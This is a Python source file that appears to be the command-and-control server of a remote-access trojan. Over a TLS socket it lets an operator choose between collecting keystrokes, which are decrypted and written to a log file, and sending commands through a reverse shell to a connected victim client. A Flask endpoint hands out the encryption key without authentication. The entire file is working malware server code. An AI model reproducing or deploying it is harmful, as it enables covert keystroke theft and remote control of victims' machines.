import socket
import ssl
import os
import threading
from flask import Flask, jsonify
from cryptography.fernet import Fernet
from threading import Thread

# Flask app for serving encryption key
app = Flask(__name__)

class SecureServer:
    def __init__(self):
        self.server_ip = "192.168.204.129"
        self.server_port = 5555
        self.filepath = "encryption.txt"

        # Generate or load encryption key
        if not os.path.exists(self.filepath) or os.stat(self.filepath).st_size == 0:
            self.key = Fernet.generate_key()
            with open(self.filepath, "wb") as f:
                f.write(self.key)
        else:
            with open(self.filepath, "rb") as f:
                self.key = f.read()

        self.cipher = Fernet(self.key)

        # SSL context setup
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.context.load_cert_chain(certfile="server.crt", keyfile="server.key")

    def start(self):
        """Start the secure server."""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.server_ip, self.server_port))
        server.listen(1)

        self.secure_server = self.context.wrap_socket(server, server_side=True)
        print(f"Server listening on {self.server_ip}:{self.server_port}...")

    def keyLogger(self, client):
      """Handles keylogging data from the client."""
      print("Starting keylogger session...")
      self.stop_logging = False

      # Function to listen for stop command
      def stop_listener():
          while True:
              command = input("Enter 'stop' to stop: ")
              if command == "stop":
                  self.stop_logging = True
                  client.send(command.encode())
                  print("Stopping keylogger session...")
                
                  if os.path.exists("keylogs.txt"):
                      with open("keylogs.txt", "r") as p:
                          logs = p.read()
                          print("\nCaptured Keystrokes:\n", logs)
                  else:
                      print("No Key Logs found.")
                  return

      threading.Thread(target=stop_listener, daemon=True).start()

      if os.path.exists("keylogs.txt"):
          open("keylogs.txt", "w").close()

      # Start keylogging
      with open("keylogs.txt", "a") as keyLogs:
          while not self.stop_logging:
              try:
                  client.settimeout(5)  
                  data = client.recv(1024)
                  if not data:
                      break

                  decrypted_data = self.cipher.decrypt(data).decode()
                  decrypted_data = decrypted_data.replace("'", "")

                  if decrypted_data == "Key.enter":
                      decrypted_data = "\n"
                  elif decrypted_data == "Key.space":
                      decrypted_data = " "
                  elif decrypted_data in ["Key.shift", "Key.ctrl"]:
                      decrypted_data = ""

                  keyLogs.write(decrypted_data)
                  keyLogs.flush()

              except socket.timeout:
                  continue  
              except Exception as e:
                  print(f"Decryption failed: {e}")
                  break

      client.settimeout(None)  
      return

    def reverseShell(self, client):
        """Handles reverse shell connection from the client."""
        print("Reverse shell session started...")

        while True:
            command = input("shell> ")
            if command.lower() == "exit":
                client.send(command.encode())
                break

            client.send(command.encode())
            response = client.recv(4096).decode()
            print(response)
        return
    
    
    def start_client(self):
        client, address = self.secure_server.accept()
        print(f"Secure connection from {address}")
        self.handle_client(client)
        return
    
    def handle_client(self, client):
        while True:
            try:
                # Send user choice to client
                print("\n1) Keylogger\n2) Reverse Shell\n3) Exit")
                choice = input("input> ")
                client.send(choice.encode())

                if choice == "1":
                    self.keyLogger(client)
                elif choice == "2":
                    self.reverseShell(client)
                elif choice == "3":
                    client.close()
                    self.secure_server.close()
                    break
                else:
                    print("Invalid option.")
                    client.close()

            except Exception as e:
                print(f"Error: {e}")       
        return       

# Flask route for encryption key retrieval
@app.route("/get_key", methods=["GET"])
def get_key():
    with open("encryption.txt", "rb") as key_file:
        key = key_file.read()
    return jsonify({"key": key.decode()})

if __name__ == "__main__":
    server = SecureServer()
    server.start()

    # Start Flask API in a separate thread
    flask_thread = Thread(target=lambda: app.run(host="0.0.0.0", port=5000), daemon=True)
    flask_thread.start()

    server.start_client()
    

